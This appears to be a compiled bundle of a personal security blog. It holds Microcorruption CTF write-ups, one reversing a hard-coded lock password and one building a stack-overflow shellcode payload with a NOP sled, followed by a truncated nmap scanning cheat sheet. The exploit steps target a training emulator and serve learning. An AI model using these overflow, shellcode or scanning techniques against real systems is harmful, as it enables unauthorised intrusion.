<span class="line"><span style="color:#79C0FF">3012</span><span style="color:#E6EDF3"> 0a00      </span><span style="color:#FF7B72">push</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0xa</span><span style="color:#8B949E">                      ; newline character</span></span>
<span class="line"><span style="color:#79C0FF">0312</span><span style="color:#FF7B72">           push</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x0</span><span style="color:#8B949E">                      ; putchar the newline character &#x3C;INT></span></span>
<span class="line"><span style="color:#E6EDF3">b012 </span><span style="color:#79C0FF">6424</span><span style="color:#FF7B72">      call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x2464</span><span style="color:#E6EDF3"> &#x3C;</span><span style="color:#FF7B72">INT</span><span style="color:#E6EDF3">>             </span><span style="color:#8B949E">;</span></span>
<span class="line"><span style="color:#79C0FF">2152</span><span style="color:#FF7B72">           add</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">sp</span></span>
<span class="line"><span style="color:#79C0FF">3012</span><span style="color:#E6EDF3"> 1f00      </span><span style="color:#FF7B72">push</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x1f</span></span>
<span class="line"><span style="color:#E6EDF3">3f40 dcff      </span><span style="color:#FF7B72">mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0xffdc</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r15</span><span style="color:#E6EDF3">              </span></span>
<span class="line"><span style="color:#E6EDF3">0f54           </span><span style="color:#FF7B72">add</span><span style="color:#E6EDF3">	r4, </span><span style="color:#79C0FF">r15</span></span>
<span class="line"><span style="color:#E6EDF3">0f12           </span><span style="color:#FF7B72">push</span><span style="color:#79C0FF">	r15</span><span style="color:#8B949E">                       ; location to store user input </span></span>
<span class="line"><span style="color:#79C0FF">2312</span><span style="color:#FF7B72">           push</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x2</span><span style="color:#8B949E">                      ; read characters from standard input </span></span>
<span class="line"><span style="color:#E6EDF3">b012 </span><span style="color:#79C0FF">6424</span><span style="color:#FF7B72">      call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x2464</span><span style="color:#E6EDF3"> &#x3C;</span><span style="color:#FF7B72">INT</span><span style="color:#E6EDF3">>             </span><span style="color:#8B949E">;</span></span>
<span class="line"><span style="color:#79C0FF">3150</span><span style="color:#79C0FF"> 0600</span><span style="color:#FF7B72">      add</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x6</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">sp</span></span>
<span class="line"><span style="color:#E6EDF3">b490 0cc6 dcff </span><span style="color:#FF7B72">cmp</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0xc60c</span><span style="color:#E6EDF3">, -</span><span style="color:#79C0FF">0x24</span><span style="color:#E6EDF3">(r4)        </span><span style="color:#8B949E">; check 43fe - 24 = 43DA to be equal to c60c (or 0cc6 )</span></span>
<span class="line"><span style="color:#79C0FF">0520</span><span style="color:#FF7B72">           jnz</span><span style="color:#E6EDF3">	$+</span><span style="color:#79C0FF">0xc</span></span>
<span class="line"><span style="color:#79C0FF">3012</span><span style="color:#E6EDF3"> 7f00      </span><span style="color:#FF7B72">push</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x7f</span><span style="color:#8B949E">                     ; check if password is correct and unlock if true</span></span>
<span class="line"><span style="color:#E6EDF3">b012 </span><span style="color:#79C0FF">6424</span><span style="color:#FF7B72">      call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x2464</span><span style="color:#E6EDF3"> &#x3C;</span><span style="color:#FF7B72">INT</span><span style="color:#E6EDF3">>             </span><span style="color:#8B949E">; </span></span>
<span class="line"><span style="color:#79C0FF">2153</span><span style="color:#E6EDF3">           incd	</span><span style="color:#79C0FF">sp</span></span>
<span class="line"><span style="color:#79C0FF">3150</span><span style="color:#79C0FF"> 2000</span><span style="color:#FF7B72">      add</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x20</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">sp</span></span>
<span class="line"><span style="color:#79C0FF">3441</span><span style="color:#FF7B72">           pop</span><span style="color:#E6EDF3">	r4</span></span>
<span class="line"><span style="color:#E6EDF3">3b41           </span><span style="color:#FF7B72">pop</span><span style="color:#79C0FF">	r11</span></span>
<span class="line"><span style="color:#79C0FF">3041</span><span style="color:#FF7B72">           ret</span></span>
<span class="line"></span>
<span class="line"><span style="color:#79C0FF">2464</span><span style="color:#E6EDF3">: &#x3C;</span><span style="color:#FF7B72">INT</span><span style="color:#E6EDF3">> </span><span style="color:#8B949E">; this is the exact same code as the interrupt function</span></span>
<span class="line"><span style="color:#79C0FF">1e41</span><span style="color:#79C0FF"> 0200</span><span style="color:#FF7B72">      mov</span><span style="color:#79C0FF">	0x2</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">sp</span><span style="color:#E6EDF3">), </span><span style="color:#79C0FF">r14</span></span>
<span class="line"><span style="color:#79C0FF">0212</span><span style="color:#FF7B72">           push</span><span style="color:#E6EDF3">	sr</span></span>
<span class="line"><span style="color:#E6EDF3">0f4e           </span><span style="color:#FF7B72">mov</span><span style="color:#79C0FF">	r14</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r15</span></span>
<span class="line"><span style="color:#E6EDF3">8f10           swpb	</span><span style="color:#79C0FF">r15</span></span>
<span class="line"><span style="color:#E6EDF3">024f           </span><span style="color:#FF7B72">mov</span><span style="color:#79C0FF">	r15</span><span style="color:#E6EDF3">, sr</span></span>
<span class="line"><span style="color:#E6EDF3">32d0 </span><span style="color:#79C0FF">0080</span><span style="color:#E6EDF3">      bis	#</span><span style="color:#79C0FF">0x8000</span><span style="color:#E6EDF3">, sr</span></span>
<span class="line"><span style="color:#E6EDF3">b012 </span><span style="color:#79C0FF">1000</span><span style="color:#FF7B72">      call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x10</span></span>
<span class="line"><span style="color:#79C0FF">3241</span><span style="color:#FF7B72">           pop</span><span style="color:#E6EDF3">	sr</span></span>
<span class="line"><span style="color:#79C0FF">3041</span><span style="color:#FF7B72">           ret</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E6EDF3">... more code that stopped making sense</span></span></code></pre>`);var t=a(p,4);n(t,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#79C0FF">3150</span><span style="color:#79C0FF"> 0600</span><span style="color:#FF7B72">      add</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x6</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">sp</span></span>
<span class="line"><span style="color:#E6EDF3">b490 0cc6 dcff </span><span style="color:#FF7B72">cmp</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0xc60c</span><span style="color:#E6EDF3">, -</span><span style="color:#79C0FF">0x24</span><span style="color:#E6EDF3">(r4)        </span><span style="color:#8B949E">; check 43fe - 24 = 43DA to be equal to c60c (or 0cc6 accounting for endian)</span></span>
<span class="line"><span style="color:#79C0FF">0520</span><span style="color:#FF7B72">           jnz</span><span style="color:#E6EDF3">	$+</span><span style="color:#79C0FF">0xc</span></span>
<span class="line"><span style="color:#79C0FF">3012</span><span style="color:#E6EDF3"> 7f00      </span><span style="color:#FF7B72">push</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x7f</span><span style="color:#8B949E">                     ; check if password is correct and unlock if true</span></span>
<span class="line"><span style="color:#E6EDF3">b012 </span><span style="color:#79C0FF">6424</span><span style="color:#FF7B72">      call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x2464</span><span style="color:#E6EDF3"> &#x3C;</span><span style="color:#FF7B72">INT</span><span style="color:#E6EDF3">>             </span></span></code></pre>`),S(2),g(e,s)}const wa=Object.freeze(Object.defineProperty({__proto__:null,default:la,metadata:aa},Symbol.toStringTag,{value:"Module"})),oa={title:"Microcorruption Sydney",date:"2025-02-01T10:00:00",description:"The process and solution for the second Microcorruption level",categories:["microcorruption","reversing","pwn"]};var pa=B('<p>In this challenge we are given the lock again with the standard information about it.</p> <!> <p>Again we look at the check_password function:</p> <!> <p>It appears that this is a simple comparison chain. It is simply checking 2 bytes of the password at a time. So we just need to put these bytes together to create our password.</p> <p>One thing to keep in mind is the endianness of the data being retrieved from memory. In this case, the system uses little endian (you can determine this by inputting data and looking how it is stored/retrieved from memory. Alternatively, you can read the manual and google MSP430. The manual can be found here: <a href="https://microcorruption.com/public/manual.pdf" rel="nofollow">https://microcorruption.com/public/manual.pdf</a>).</p> <p>That means data is stored with the most significant byte at the lowest memory address. Since we are retrieving and comparing the data a word at a time, we need to flip each individual word instead of the entire password.</p> <!> <p>Using this input (remember to select hex encoded), we are able to solve this challenge.</p>',1);function ea(e){var s=pa(),l=a(b(s),2);n(l,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span>There is  no default password  on the LockIT  Pro---upon receiving</span></span>
<span class="line"><span>the LockIT Pro, a new password must be set by connecting it to the</span></span>
<span class="line"><span>LockIT Pro  App and  entering a password  when prompted,  and then</span></span>
<span class="line"><span>restarting the LockIT Pro using the red button on the back.</span></span></code></pre>`);var o=a(l,4);n(o,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#E6EDF3">448a &#x3C;check_password></span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">448a:</span><span style="color:#E6EDF3">  bf90 403c </span><span style="color:#79C0FF">0000</span><span style="color:#FF7B72"> cmp</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x3c40</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">0x0</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">r15</span><span style="color:#E6EDF3">)</span></span>
<span class="line"><span style="color:#79C0FF">4490</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">0d20</span><span style="color:#FF7B72">           jnz</span><span style="color:#E6EDF3">	$+</span><span style="color:#79C0FF">0x1c</span><span style="color:#E6EDF3"> &#x3C;check_password+</span><span style="color:#79C0FF">0x22</span><span style="color:#E6EDF3">></span></span>
<span class="line"><span style="color:#79C0FF">4492</span><span style="color:#E6EDF3">:  bf90 5b4b </span><span style="color:#79C0FF">0200</span><span style="color:#FF7B72"> cmp</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4b5b</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">0x2</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">r15</span><span style="color:#E6EDF3">)</span></span>
<span class="line"><span style="color:#79C0FF">4498</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">0920</span><span style="color:#FF7B72">           jnz</span><span style="color:#E6EDF3">	$+</span><span style="color:#79C0FF">0x14</span><span style="color:#E6EDF3"> &#x3C;check_password+</span><span style="color:#79C0FF">0x22</span><span style="color:#E6EDF3">></span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">449a:</span><span style="color:#E6EDF3">  bf90 556f </span><span style="color:#79C0FF">0400</span><span style="color:#FF7B72"> cmp</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x6f55</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">0x4</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">r15</span><span style="color:#E6EDF3">)</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">44a0:</span><span style="color:#79C0FF">  0520</span><span style="color:#FF7B72">           jnz</span><span style="color:#E6EDF3">	$+</span><span style="color:#79C0FF">0xc</span><span style="color:#E6EDF3"> &#x3C;check_password+</span><span style="color:#79C0FF">0x22</span><span style="color:#E6EDF3">></span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">44a2:</span><span style="color:#79C0FF">  1e43</span><span style="color:#FF7B72">           mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x1</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r14</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">44a4:</span><span style="color:#E6EDF3">  bf90 </span><span style="color:#79C0FF">6041</span><span style="color:#79C0FF"> 0600</span><span style="color:#FF7B72"> cmp</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4160</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">0x6</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">r15</span><span style="color:#E6EDF3">)</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">44aa:</span><span style="color:#79C0FF">  0124</span><span style="color:#FF7B72">           jz</span><span style="color:#E6EDF3">	$+</span><span style="color:#79C0FF">0x4</span><span style="color:#E6EDF3"> &#x3C;check_password+</span><span style="color:#79C0FF">0x24</span><span style="color:#E6EDF3">></span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">44ac:</span><span style="color:#79C0FF">  0e43</span><span style="color:#E6EDF3">           clr	</span><span style="color:#79C0FF">r14</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">44ae:</span><span style="color:#E6EDF3">  0f4e           </span><span style="color:#FF7B72">mov</span><span style="color:#79C0FF">	r14</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r15</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">44b0:</span><span style="color:#79C0FF">  3041</span><span style="color:#FF7B72">           ret</span></span></code></pre>`);var p=a(o,8);n(p,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span>3c40 -> 403c </span></span>
<span class="line"><span>4b5b -> 5b4b</span></span>
<span class="line"><span>6f55 -> 556f</span></span>
<span class="line"><span>4160 -> 6041</span></span>
<span class="line"><span></span></span>
<span class="line"><span>Result: 403c5b4b556f6041</span></span></code></pre>`),S(2),g(e,s)}const xa=Object.freeze(Object.defineProperty({__proto__:null,default:ea,metadata:oa},Symbol.toStringTag,{value:"Module"})),ta={title:"Microcorruption Whitehorse",date:"2025-02-09T04:00:00",description:"The process and solution for the sixth Microcorruption level",categories:["microcorruption","reversing","pwn"]};var ra=B('<p>As always here is the manual for Microcorruption:</p> <ul><li>Manual: <a href="https://microcorruption.com/public/manual.pdf" rel="nofollow">https://microcorruption.com/public/manual.pdf</a></li></ul> <p>Additionally, the MSP430 specific booklets:</p> <ul><li>User Guide: <a href="https://www.ti.com/lit/ug/slau049f/slau049f.pdf" rel="nofollow">https://www.ti.com/lit/ug/slau049f/slau049f.pdf</a></li> <li>ABI: <a href="https://www.ti.com/lit/an/slaa534a/slaa534a.pdf" rel="nofollow">https://www.ti.com/lit/an/slaa534a/slaa534a.pdf</a></li></ul> <p>Again our main function simply calls the login function, so lets looks at this function.</p> <!> <p>As we can see the function is expecting an input of size 30 but we are able to write an arbitrary length. Lets generate a pattern and see where the program pointer points when it crashes. (<a href="https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html" rel="nofollow">https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html</a>)</p> <!> <p>As expected stack error:</p> <!> <p>The pc is as follows:</p> <!> <p>Okay so we can control where the program returns. We also know from the manual that an interrupt of value 0x7F will unlock the lock.</p> <p>We can craft shellcode and put it on the stack and then jump back into it because we control the return address.</p> <p>So our payload should look something like this:</p> <!> <p>First lets create the shellcode. We can borrow the code from the conditional_door_unlock function.</p> <!> <!> <p>Lets change it to be a 0x7f interrupt. And we can use our disassembler to confirm it: <a href="https://microcorruption.com/assembler" rel="nofollow">https://microcorruption.com/assembler</a>.</p> <!> <p>Next lets get the stack address. Running the program with a bunch of As tells us the stack address is 3dfe.</p> <!> <p>According to the MSP430 manual a emulation for a NOP sled should be:</p> <!> <p>Knowing this lets use it for our sled. We know the shellcode is 16 nibbles (half a byte) so we need to fill use the other 32-16=16 nibbles. Since our NOP is 4 nibbles we need it 4 times. Because this address isn’t changing, we really do not need the NOP (as long as the return address is at offset 32), but it is good practice to create one.</p> <!> <p>Using python and remembering that our return address must use little endian:</p> <!> <p>This solution successfully opens the lock.</p>',1);function ca(e){var s=ra(),l=a(b(s),10);n(l,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#E6EDF3">44f4 &#x3C;login></span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">44f4:</span><span style="color:#79C0FF">  3150</span><span style="color:#E6EDF3"> f0ff      </span><span style="color:#FF7B72">add</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0xfff0</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">sp</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">44f8:</span><span style="color:#E6EDF3">  3f40 </span><span style="color:#79C0FF">7044</span><span style="color:#FF7B72">      mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4470</span><span style="color:#E6EDF3"> "</span><span style="color:#FF7B72">Enter</span><span style="color:#E6EDF3"> the password to continue.", </span><span style="color:#79C0FF">r15</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">44fc:</span><span style="color:#E6EDF3">  b012 </span><span style="color:#79C0FF">9645</span><span style="color:#FF7B72">      call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4596</span><span style="color:#E6EDF3"> &#x3C;puts></span></span>
<span class="line"><span style="color:#79C0FF">4500</span><span style="color:#E6EDF3">:  3f40 </span><span style="color:#79C0FF">9044</span><span style="color:#FF7B72">      mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4490</span><span style="color:#E6EDF3"> "</span><span style="color:#D2A8FF">Remember:</span><span style="color:#E6EDF3"> passwords are between </span><span style="color:#79C0FF">8</span><span style="color:#FF7B72"> and</span><span style="color:#79C0FF"> 16</span><span style="color:#E6EDF3"> characters.", </span><span style="color:#79C0FF">r15</span></span>
<span class="line"><span style="color:#79C0FF">4504</span><span style="color:#E6EDF3">:  b012 </span><span style="color:#79C0FF">9645</span><span style="color:#FF7B72">      call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4596</span><span style="color:#E6EDF3"> &#x3C;puts></span></span>
<span class="line"><span style="color:#79C0FF">4508</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">3e40</span><span style="color:#79C0FF"> 3000</span><span style="color:#FF7B72">      mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x30</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r14</span><span style="color:#E6EDF3">             </span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">450c:</span><span style="color:#E6EDF3">  0f41           </span><span style="color:#FF7B72">mov</span><span style="color:#79C0FF">	sp</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r15</span><span style="color:#E6EDF3">    </span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">450e:</span><span style="color:#E6EDF3">  b012 </span><span style="color:#79C0FF">8645</span><span style="color:#FF7B72">      call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4586</span><span style="color:#E6EDF3"> &#x3C;getsn>                  </span><span style="color:#8B949E">; read arbitrary length </span></span>
<span class="line"><span style="color:#79C0FF">4512</span><span style="color:#E6EDF3">:  0f41           </span><span style="color:#FF7B72">mov</span><span style="color:#79C0FF">	sp</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r15</span></span>
<span class="line"><span style="color:#79C0FF">4514</span><span style="color:#E6EDF3">:  b012 </span><span style="color:#79C0FF">4644</span><span style="color:#FF7B72">      call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4446</span><span style="color:#E6EDF3"> &#x3C;conditional_unlock_door></span></span>
<span class="line"><span style="color:#79C0FF">4518</span><span style="color:#E6EDF3">:  0f93           tst	</span><span style="color:#79C0FF">r15</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">451a:</span><span style="color:#79C0FF">  0324</span><span style="color:#FF7B72">           jz</span><span style="color:#E6EDF3">	$+</span><span style="color:#79C0FF">0x8</span><span style="color:#E6EDF3"> &#x3C;login+</span><span style="color:#79C0FF">0x2e</span><span style="color:#E6EDF3">></span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">451c:</span><span style="color:#E6EDF3">  3f40 c544      </span><span style="color:#FF7B72">mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x44c5</span><span style="color:#E6EDF3"> "Access granted.", </span><span style="color:#79C0FF">r15</span></span>
<span class="line"><span style="color:#79C0FF">4520</span><span style="color:#E6EDF3">:  023c           </span><span style="color:#FF7B72">jmp</span><span style="color:#E6EDF3">	$+</span><span style="color:#79C0FF">0x6</span><span style="color:#E6EDF3"> &#x3C;login+</span><span style="color:#79C0FF">0x32</span><span style="color:#E6EDF3">></span></span>
<span class="line"><span style="color:#79C0FF">4522</span><span style="color:#E6EDF3">:  3f40 d544      </span><span style="color:#FF7B72">mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x44d5</span><span style="color:#E6EDF3"> "That password is </span><span style="color:#FF7B72">not</span><span style="color:#E6EDF3"> correct.", </span><span style="color:#79C0FF">r15</span></span>
<span class="line"><span style="color:#79C0FF">4526</span><span style="color:#E6EDF3">:  b012 </span><span style="color:#79C0FF">9645</span><span style="color:#FF7B72">      call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4596</span><span style="color:#E6EDF3"> &#x3C;puts></span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">452a:</span><span style="color:#79C0FF">  3150</span><span style="color:#79C0FF"> 1000</span><span style="color:#FF7B72">      add</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x10</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">sp</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">452e:</span><span style="color:#79C0FF">  3041</span><span style="color:#FF7B72">           ret</span></span></code></pre>`);var o=a(l,4);n(o,()=>'<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span>Pattern: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab</span></span></code></pre>');var p=a(o,4);n(p,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span>> c</span></span>
<span class="line"><span>> c</span></span>
<span class="line"><span>insn address unaligned</span></span></code></pre>`);var t=a(p,4);n(t,()=>'<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span>pc: b10a -> 0Ab1 (endianness) @ offset 32</span></span></code></pre>');var r=a(t,8);n(r,()=>'<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span>payload = NOP + shellcode + stack address</span></span></code></pre>');var c=a(r,4);n(c,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#79C0FF">4446</span><span style="color:#E6EDF3"> &#x3C;conditional_unlock_door></span></span>
<span class="line"><span style="color:#E6EDF3">...</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">445c:</span><span style="color:#79C0FF">  3012</span><span style="color:#79C0FF"> 7e00</span><span style="color:#FF7B72">      push</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x7e</span></span>
<span class="line"><span style="color:#79C0FF">4460</span><span style="color:#E6EDF3">:  b012 </span><span style="color:#79C0FF">3245</span><span style="color:#FF7B72">      call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4532</span><span style="color:#E6EDF3"> &#x3C;</span><span style="color:#FF7B72">INT</span><span style="color:#E6EDF3">></span></span>
<span class="line"><span style="color:#E6EDF3">...</span></span></code></pre>`);var y=a(c,2);n(y,()=>'<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span>shellcode: 3012 7e00 b012 3245 </span></span></code></pre>');var u=a(y,4);n(u,()=>'<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span>3012 7f00 b012 3245 </span></span></code></pre>');var E=a(u,4);n(E,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span>> reset</span></span>
<span class="line"><span>> c</span></span>
<span class="line"><span>> s</span></span>
<span class="line"><span></span></span>
<span class="line"><span>sp -> 3dfe</span></span>
<span class="line"><span></span></span>
<span class="line"><span>3df0: 4645 0000 9045 0200 fe3d 3000 1245 4141   FE...E...=0..EAA</span></span>
<span class="line"><span>3e00: 4141 4141 4141 4141 4141 4141 4141 4141   AAAAAAAAAAAAAAAA</span></span>
<span class="line"><span>3e10: 4141 4141 4141 4141 4141 4141 4141 4141   AAAAAAAAAAAAAAAA</span></span>
<span class="line"><span>3e20: 4141 4141 4141 4141 4141 4141 4141 0000   AAAAAAAAAAAAAA.</span></span></code></pre>`);var f=a(E,4);n(f,()=>'<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span>0444    mov r4, r4</span></span></code></pre>');var F=a(f,4);n(F,()=>'<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span>(0444)*4 + 3012 7f00 b012 3245 + 3dfe </span></span></code></pre>');var D=a(F,4);n(D,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span>>>> "0444"*4 + "30127f00b0123245" + "fe3d"</span></span>
<span class="line"><span>'044404440444044430127f00b0123245fe3d'</span></span></code></pre>`),S(2),g(e,s)}const ka=Object.freeze(Object.defineProperty({__proto__:null,default:ca,metadata:ta},Symbol.toStringTag,{value:"Module"})),Fa={title:"Quick Start with Nmap",date:"2025-01-31T00:00:00",description:"My notes for quickly getting scans running with nmap",categories:["notes","nmap"]};var ia=B(`<h4>Online Reference Guide</h4> <p><a href="https://nmap.org/book/man-briefoptions.html" rel="nofollow">https://nmap.org/book/man-briefoptions.html</a></p> <h4>Techniques in detail</h4> <p><a href="https://nmap.org/book/host-discovery-techniques.html" rel="nofollow">https://nmap.org/book/host-discovery-techniques.html</a></p> <h4>ICMP Ping Sweep scan</h4> <p>Check if IP(s) are Up (this can be turned off on machine, trust but verify)</p> <!> <h4>List Alive IPs in range</h4> <!> <h4>HTB TCP quick scan</h4> <p>Gets TCP ports that are open, then scans them deeply</p> <!> <h4>Basic TCP scan</h4> <p>Grabs open TCP ports</p> <!> <h4>Stealth Scan</h4> <p>Stealth scan (-sS) is default for sudo. This is technically a SYN scan (never completes TCP connection)</p> <!> <h4>UDP Scan</h4> <!> <h4>ARP Scan</h4> <p>Best used for scanning local targets (<a href="https://nmap.org/book/host-discovery-techniques.html" rel="nofollow">https://nmap.org/book/host-discovery-techniques.html</a>)</p> <!> <h4>Information Scan</h4> <p>Get version information of scan</p> <!> <h4>Information, Script, OS Scan</h4> <p>Version (-sV)
Common scripts (-sC)
OS Detection (-A)</p> <!> <h4>Multiple Host Flag</h4> <!> <h4>File Output Flag</h4> <!> <h4>Quick Options Table</h4> <p>from HTB, see nmap docs for more detailed guide</p> <table><thead><tr><th>Option</th><th>Description</th></tr></thead><tbody><tr><td><code>10.10.10.0/24</code></td><td>Target network range.</td></tr><tr><td><code>-sn</code></td><td>Disables port scanning.</td></tr><tr><td><code>-Pn</code></td><td>Disables ICMP Echo Requests</td></tr><tr><td><code>-n</code></td><td>Disables DNS Resolution.</td></tr><tr><td><code>-PE</code></td><td>Performs the ping scan by using ICMP Echo Requests against the target.</td></tr><tr><td><code>--packet-trace</code></td><td>Shows all packets sent and received.</td></tr><tr><td><code>--reason</code></td><td>Displays the reason for a specific result.</td></tr><tr><td><code>--disable-arp-ping</code></td><td>Disables ARP Ping Requests.</td></tr><tr><td><code>--top-ports=&lt;num&gt;</code></td><td>Scans the specified top ports that have been defined as most frequent.</td></tr><tr><td><code>-p-</code></td><td>Scan all ports.</td></tr><tr><td><code>-p22-110</code></td><td>Scan all ports between 22 and 110.</td></tr><tr><td><code>-p22,25</code></td><td>Scans only the specified ports 22 and 25.</td></tr><tr><td><code>-F</code></td><td>Scans top 100 ports.</td></tr><tr><td><code>-sS</code></td><td>Performs an TCP SYN-Scan.</td></tr><tr><td><code>-sA</code></td><td>Performs an TCP ACK-Scan.</td></tr><tr><td><code>-sU</code></td><td>Performs an UDP Scan.</td></tr><tr><td><code>-sV</code></td><td>Scans the discovered services for their versions.</td></tr><tr><td><code>-sC</code></td><td>Perform a Script Scan with scripts that are categorized as “default”.</td></tr><tr><td><code>--script &lt;script&gt;</code></td><td>Performs a Script Scan by using the specified scripts.</td></tr><tr><td><code>-O</code></td><td>Performs an OS Detection Scan to determine the OS of the target.</td></tr><tr><td><code>-A</code></td><td>Performs OS Detection, Service Detection, and traceroute scans.</td></tr><tr><td><code>-D RND:5</code></td><td>Sets the number of random Decoys that will be used to scan the target.</td></tr><tr><td><code>-e</code></td><td>Specifies the network interface that is used for the scan.</td></tr><tr><td><code>-S 10.10.10.200</code></td><td>Specifies the source IP address for the scan.</td></tr><tr><td><code>-g</code></td><td>Specifies the source port for the scan.</td></tr><tr><td><code>--dns-server &lt;ns&gt;</code></td><td>DNS resolution is performed by using a specified name server.</td></tr><tr><td></td><td></td></tr><tr><td><code>--max-retries &lt;num&gt;</code></td><td>Sets the number of retries for scans of specific 